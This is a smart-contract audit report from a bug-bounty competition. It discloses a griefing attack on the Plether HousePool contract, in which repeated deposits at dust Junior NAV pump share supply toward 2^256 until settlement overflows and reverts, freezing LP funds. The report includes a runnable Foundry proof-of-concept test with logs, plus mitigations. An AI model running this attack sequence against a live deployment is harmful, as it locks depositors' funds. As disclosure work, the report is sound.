# \#99070 [SC-High] At dust Junior NAV, an attacker pumps Junior share supply to ~2^256 for 268 USDG, after which any Junior deposit overflows activation and reverts every weekday `settleLpEpoch`

**Submitted on Nov 11th 2026 at 18:25:17 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99070
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

### Brief/Intro

Junior deposits are deferred only when Junior NAV is **exactly 0**. If an honest loss leaves Junior at dust (a few USDG, or even a few atoms) while Senior sits at its high-water mark, the share price is close to zero but deposits still activate. Settlement timing is permissionless, and the Senior coupon drains Junior every second without burning shares. An attacker can therefore deposit, let the coupon move that deposit to Senior, and settle at the exact second Junior NAV is a few hundred atoms. Each cycle multiplies Junior supply by ~10^4. After 14 cycles (42 h, 268.53 USDG, all paid to Senior) supply is 8.3e76, which is 72 % of `type(uint256).max`. From then on, any honest Junior deposit overflows the activation quote with Panic 0x11, and the **entire** `settleLpEpoch` reverts with it.

### Vulnerability Details

**1. Only NAV == 0 is guarded, not NAV ≈ 0.**

```solidity
// HousePool.sol:915-920
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
@> bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

The entry gate has the same `== 0` check (`HousePool.sol:494-497`). Junior `maxRequestDeposit` is `type(uint256).max` (`TrancheVault.sol:1325`). At Junior NAV `x` atoms, a deposit `d` mints:

```solidity
// TrancheVault.sol:1408-1409   (feeBps == 0 → denominator = x + 1)
uint256 denominator = pricingAssets + assets + 1 - netAssets;
shares = Math.mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, denominator, Math.Rounding.Floor);
```

so supply grows by a factor of roughly `d / (x+1)` per activation.

**2. The Senior coupon takes the deposit back without touching shares.**

```solidity
// HousePoolWaterfallAccountingLib.sol:76-77  (via _reconcile, HousePool.sol:835, at the start of every settle)
couponPaid = couponDue < state.juniorPrincipal ? couponDue : state.juniorPrincipal;
nextState.juniorPrincipal -= couponPaid;
```

The coupon accrues per second and `settleLpEpoch` is permissionless. The attacker picks the second at which `J − couponDue` is 22-2,167 atoms, and its deposit is priced there. The previous deposit has already flowed to Senior, so Junior is back at dust for the next cycle. Nothing caps the supply growth.

**3. Overflow is fatal, not rejected.**

```solidity
// HousePool.sol:1046-1050
@> uint256 cumulativeShares = vault.quoteDepositFromState(          // unguarded mulDiv → Panic 0x11
       phase.acceptedAssets + epochAssets, phase.pricingAssets, phase.pricingSupply, feeBps
   );
   uint256 shares = _saturatingSubtract(cumulativeShares, phase.mintedShares);
   if (shares == 0) {                                               // only this case becomes a rejection
```

Once supply is near 2^256, `mulDiv` (or `_mint`'s `totalSupply` add) panics, and the redemption phases that already ran in the same call (`HousePool.sol:838-905`) revert as well.

**4. The stuck head cannot leave the queue.** `cancelPendingDeposit` reverts `TrancheVault__DepositEpochAlreadyActive` for a matured, non-rejected Junior request while NAV is non-zero and Senior is unimpaired (`TrancheVault.sol:851-857`). Every settle retries the same head and reverts again.

**Preconditions:**
- Junior principal is dust (> 0), and Senior is at HWM after an honest loss (in the PoC, a trader SHORT realizes a loss of about Junior NAV).
- Senior is large enough that ~1 h of coupon is ≥ 1 USDG (≥ ~110k USDG at 800 bps; the PoC uses 751k).
- No large Junior deposit arrives during the ~42 h pump, and trading is quiet enough to call `settleLpEpoch` at a chosen second.

Every attacker action is permissionless: `requestDeposit`, `settleLpEpoch`, `claimDeposit`.

### Impact Details

- **Weekday LP settlement is frozen.** In the PoC, 62 of 62 hourly `settleLpEpoch` calls revert from Wednesday to the Friday close. A 75k Senior redemption stays unfunded, and so do all other exits and deposits. Weekend (oracle-frozen) settles defer entries, so exits clear only then, and they pay the frozen-LP fee (`HousePool.sol:1139-1145`). On Monday the freeze resumes.
- **The honest depositor's 10,000 USDG is locked.** It cannot activate and cannot be cancelled.
- **Duration.** The freeze ends only when Junior NAV grows to about `D·N / (2^256 − N)`, which is ≈ 2.5 × the stuck deposit at the PoC's 72 % fill (~52 days at 20 USDG/h revenue for a 10k deposit), or when Junior NAV hits exactly 0. The attacker controls the final cycle's `x`, so it can land supply closer to 2^256 and make the required NAV arbitrarily large.
- **Junior cannot be recapitalized** by any deposit above ~`(headroom/N)·J`. Senior capacity is tied to Junior (`HousePoolSeniorCapacityLib.sol:87-100`), so the pool cannot regrow either.
- **Cost:** 268.53 USDG plus gas, all paid to Senior as coupon. The attacker gains nothing; this is griefing.

### Mitigation

- Treat a Junior NAV per share below a floor like NAV == 0, at both entry (`HousePool.sol:494-497`) and activation (`HousePool.sol:917`). For example, defer when `juniorPrincipal * K < supply + VIRTUAL_SHARES`.
- Make an activation that cannot be quoted or minted non-fatal: check `mulDiv`/`totalSupply` headroom first and route a failing request into the existing `shares == 0` rejection branch (`HousePool.sol:1050-1070`).

### References

- `packages/perps/src/HousePool.sol:494-497`: entry gate, `juniorPrincipal == 0` only
- `packages/perps/src/HousePool.sol:915-920`: activation deferral, `pricingAssets == 0` only
- `packages/perps/src/HousePool.sol:835`: `_reconcile` (coupon) at the start of every settle
- `packages/perps/src/HousePool.sol:1046-1050`: unguarded quote; only `shares == 0` is rejected
- `packages/perps/src/TrancheVault.sol:1408-1409`: share quote `d·(N+1000)/(x+1)`
- `packages/perps/src/TrancheVault.sol:1325`: Junior `maxRequestDeposit` unlimited
- `packages/perps/src/TrancheVault.sol:851-857`: cancel blocked with `DepositEpochAlreadyActive`
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:76-77`: coupon drains Junior principal and leaves supply unchanged

## Proof of Concept

## Proof of Concept


Save as `packages/perps/test/perps/JuniorSupplyPumpSettleOverflow.t.sol` and run:

```
forge test --root packages/perps --match-path test/perps/JuniorSupplyPumpSettleOverflow.t.sol -vv
```

The test uses only the repo's `BasePerpTest` fixture (router-pranked marks and fills, as in the existing tests).

1. `_wipeToDust()`: an honest SHORT realizes a loss of about the full Junior NAV, leaving J = 22.54 USDG with S == HWM.
2. `_pump()`: 14 cycles of `requestDeposit(d)`, then a settle at the second where projected Junior NAV is dust, then a claim.
3. An honest LP deposits 10,000 USDG into Junior and a Senior LP requests a redeem. Every weekday hourly settle reverts, and so does the cancel.
4. The weekend settle passes because entries are deferred. On Monday settlement reverts again.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

contract JuniorSupplyPumpSettleOverflowTest is BasePerpTest {

    address JA = address(0x1A1);
    address SA = address(0x5A1);
    address T = address(0x7A1);
    address T2 = address(0x7A2);
    address ATK = address(0xA77);
    address H = address(0x4A1);

    uint256 constant YEAR = 365 days;
    uint256 constant TARGET = (type(uint256).max / 100) * 95;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(JA, 250_000e6);
        _fundSenior(SA, 750_000e6);
    }

    function _markAt(uint256 px, uint256 ts) internal {
        if (ts <= engine.lastMarkTime()) ts = uint256(engine.lastMarkTime()) + 1;
        if (vm.getBlockTimestamp() < ts) vm.warp(ts);
        vm.prank(address(router));
        engine.updateMarkPrice(px, SafeCast.toUint64(vm.getBlockTimestamp()));
    }

    function _mark(uint256 px) internal {
        _markAt(px, vm.getBlockTimestamp() + 1);
    }

    function _projJ() internal view returns (uint256 j) {
        (, j) = pool.getPendingDepositTrancheState();
    }

    function _due(uint256 s, uint256 dt) internal view returns (uint256) {
        return (s * pool.seniorRateBps() * dt) / (10_000 * YEAR);
    }

    function settleExt() external returns (IHousePool.LpEpochSettlementResult memory) {
        return _settleLpEpochForTest();
    }

    // ---------------- honest junior loss leaving dust ----------------
    function _lossSequence(uint256 units) internal {
        _mark(1.7e8);
        if (units > 0) _close(T, CfdTypes.Side.SHORT, units * 100e18, 1.7e8);
        _mark(1e8);
        if (units < 4000) _close(T, CfdTypes.Side.SHORT, (4000 - units) * 100e18, 1e8);
    }

    function _wipeToDust() internal returns (uint256 units) {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _fundTrader(T, 600_000e6);
        _mark(1e8);
        _open(T, CfdTypes.Side.SHORT, 400_000e18, 300_000e6, 1e8);
        // binary search the largest realized-loss chunk count that leaves Junior > 0
        uint256 lo = 0;
        uint256 hi = 4000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 snap = vm.snapshotState();
            _lossSequence(mid);
            uint256 j = _projJ();
            vm.revertToStateAndDelete(snap);
            if (j > 0) lo = mid;
            else hi = mid - 1;
        }
        units = lo;
        _lossSequence(units);
        // a small senior exit gives the settle progress so the loss is reconciled into stored principal
        vm.prank(SA);
        seniorVault.requestRedeem(1e9, SA, SA);
        _markAt(1e8, vm.getBlockTimestamp() + 2 hours);
        require(_projJ() > 0, "dust gone");
        _settleLpEpochForTest();
    }

    // ---------------- attacker supply pump ----------------
    function _pump() internal returns (uint256 cycles, uint256 spent) {
        settlementToken.mint(ATK, 1_000_000e6);
        vm.prank(ATK);
        settlementToken.approve(address(juniorVault), type(uint256).max);
        uint256 rate = pool.seniorRateBps();
        while (juniorVault.totalSupply() < TARGET / 2) {
            uint256 J = pool.juniorPrincipal();
            uint256 S = pool.seniorPrincipal();
            uint256 t0 = pool.lastSeniorCouponCheckpointTime();
            uint256 N = juniorVault.totalSupply();
            require(J > 0 && S == pool.seniorHighWaterMark(), "precondition");
            // smallest reachable junior NAV x at the next settle: largest dt with coupon < J
            uint256 dtMax = (J * 10_000 * YEAR - 1) / (S * rate);
            uint256 d = _due(S, 3 hours);
            if (d < 1e6) d = 1e6;
            uint256 x = J - _due(S, dtMax);
            uint256 dt = dtMax;
            uint256 dBound = Math.mulDiv(TARGET - N, x + 1, N + 1000);
            if (d > dBound) {
                // final cycle: 1 USDG, raise x so supply lands at ~TARGET
                d = 1e6;
                uint256 xT = Math.mulDiv(d, N + 1000, TARGET - N) + 1;
                dt = ((J - xT) * 10_000 * YEAR) / (S * rate);
                x = J - _due(S, dt);
            }
            vm.prank(ATK);
            uint256 reqId = juniorVault.requestDeposit(d, ATK, ATK);
            uint256 tSettle = t0 + dt;
            require(tSettle >= juniorVault.depositEpochStart(reqId), "settle before maturity");
            _markAt(1e8, tSettle);
            require(!engine.isOracleFrozen(), "frozen");
            require(_projJ() == x, "x model");
            _settleLpEpochForTest();
            uint256 claimable = juniorVault.claimableDepositRequest(reqId, ATK);
            require(claimable == d, "not activated");
            vm.prank(ATK);
            juniorVault.claimDeposit(reqId, claimable, ATK, ATK);
            spent += d;
            cycles++;
            console2.log("cycle", cycles);
            console2.log("  junior NAV at activation x (atoms)", x);
            console2.log("  deposit d (atoms)", d);
            console2.log("  junior supply after", juniorVault.totalSupply());
        }
    }

    function test_B15_supplyPumpThenSettleDoS() public {
        uint256 units = _wipeToDust();
        console2.log("loss chunks", units);
        console2.log("after loss: J", pool.juniorPrincipal());
        console2.log("after loss: S", pool.seniorPrincipal());
        console2.log("after loss: HWM", pool.seniorHighWaterMark());
        console2.log("after loss: junior supply", juniorVault.totalSupply());
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "senior unimpaired");
        assertGt(pool.juniorPrincipal(), 0, "junior dust > 0");
        uint256 startTs = vm.getBlockTimestamp();

        (uint256 cycles, uint256 spent) = _pump();
        console2.log("pump cycles", cycles);
        console2.log("attacker USDG spent (all transferred to senior as coupon)", spent);
        console2.log("hours elapsed", (vm.getBlockTimestamp() - startTs) / 3600);
        uint256 N = juniorVault.totalSupply();
        console2.log("final junior supply", N);
        console2.log("headroom to uint256 max", type(uint256).max - N);
        console2.log("attacker share of junior supply bps", Math.mulDiv(juniorVault.balanceOf(ATK), 10_000, N));

        // ---------- impact: protocol keeps trading, an honest LP deposits junior, senior LP exits ----------
        _fundTrader(T2, 100_000e6);
        _mark(1e8);
        _open(T2, CfdTypes.Side.LONG, 100_000e18, 20_000e6, 1e8);

        uint256 sShares = seniorVault.maxRequestRedeem(SA) / 10;
        vm.prank(SA);
        seniorVault.requestRedeem(sShares, SA, SA);

        assertTrue(pool.canAcceptTrancheDeposits(false), "junior entry open");
        assertEq(juniorVault.maxRequestDeposit(H), type(uint256).max, "junior admits any amount");
        settlementToken.mint(H, 10_000e6);
        vm.startPrank(H);
        settlementToken.approve(address(juniorVault), 10_000e6);
        uint256 hReq = juniorVault.requestDeposit(10_000e6, H, H);
        vm.stopPrank();

        if (vm.getBlockTimestamp() < juniorVault.depositEpochStart(hReq)) {
            vm.warp(juniorVault.depositEpochStart(hReq));
        }
        uint256 seniorVaultBal0 = settlementToken.balanceOf(address(seniorVault));
        // ordinary market: the LONG drifts slowly against the trader (0.02% per hour), i.e. LP revenue > coupon
        uint256 px = 1e8;
        uint256 reverts;
        uint256 attempts;
        bytes memory lastErr;
        while (!engine.isOracleFrozen()) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            if (engine.isOracleFrozen()) break;
            px += 2e4;
            _mark(px);
            attempts++;
            uint256 pj = _projJ();
            try this.settleExt() {
                if (attempts <= 4) console2.log("attempt ok", attempts, pj);
            } catch (bytes memory e) {
                reverts++;
                lastErr = e;
                if (attempts <= 4 || attempts % 20 == 0) {
                    console2.log("attempt reverted", attempts, pj);
                    console2.logBytes(e);
                }
            }
        }
        console2.log("weekday hourly settle attempts", attempts);
        console2.log("reverted", reverts);
        console2.logBytes(lastErr);
        assertEq(reverts, attempts, "every weekday settle reverts");
        assertGt(attempts, 24, "freeze > 24h");
        assertEq(settlementToken.balanceOf(address(seniorVault)), seniorVaultBal0, "senior exit unfunded");
        console2.log("projected junior NAV during freeze", _projJ());

        vm.prank(H);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(hReq);

        // weekend: entries are deferred, so exits go through (with frozen fee)
        vm.warp(vm.getBlockTimestamp() + 12 hours);
        assertTrue(engine.isOracleFrozen(), "weekend");
        IHousePool.LpEpochSettlementResult memory r = this.settleExt();
        console2.log("weekend settle ok, entriesDeferred", r.entriesDeferred);
        console2.log("senior vault USDG after weekend settle", settlementToken.balanceOf(address(seniorVault)));

        // Monday: the honest deposit is still the matured head and settlement reverts again
        vm.warp(vm.getBlockTimestamp() + 48 hours);
        assertFalse(engine.isOracleFrozen(), "monday");
        px += 2e4;
        _mark(px);
        vm.expectRevert(abi.encodeWithSelector(bytes4(0x4e487b71), uint256(0x11)));
        this.settleExt();
        assertEq(juniorVault.claimableDepositRequest(hReq, H), 0, "honest deposit never activated");
        assertEq(juniorVault.pendingDepositRequest(hReq, H), 10_000e6, "honest deposit still pending");
        vm.prank(H);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(hReq);
        console2.log("monday settle reverts again; honest 10k junior deposit stuck");
    }
}
```

### Result

```
[PASS] test_B15_supplyPumpThenSettleDoS() (gas: 41004599)
Logs:
  after loss: J 22542246
  after loss: S 751026457715
  after loss: HWM 751026457715
  after loss: junior supply 251002283020846
  cycle 1    x 22     d 20576067   supply 2.245e20
  ...
  cycle 13   x 825    d 20582886   supply 1.796e74
  cycle 14   x 2167   d 1000000    supply 8.2998e76
  pump cycles 14
  attacker USDG spent (all transferred to senior as coupon) 268533489
  hours elapsed 42
  headroom to uint256 max 32794035835166735004308267742990322606079820412698659884847694472286680974455
  attacker share of junior supply bps 9999
  attempt reverted 1 20000000
  0x4e487b710000000000000000000000000000000000000000000000000000000000000011
  ...
  weekday hourly settle attempts 62
  reverted 62
  projected junior NAV during freeze 1240000000
  weekend settle ok, entriesDeferred true
  senior vault USDG after weekend settle 74845129886
  monday settle reverts again; honest 10k junior deposit stuck
```

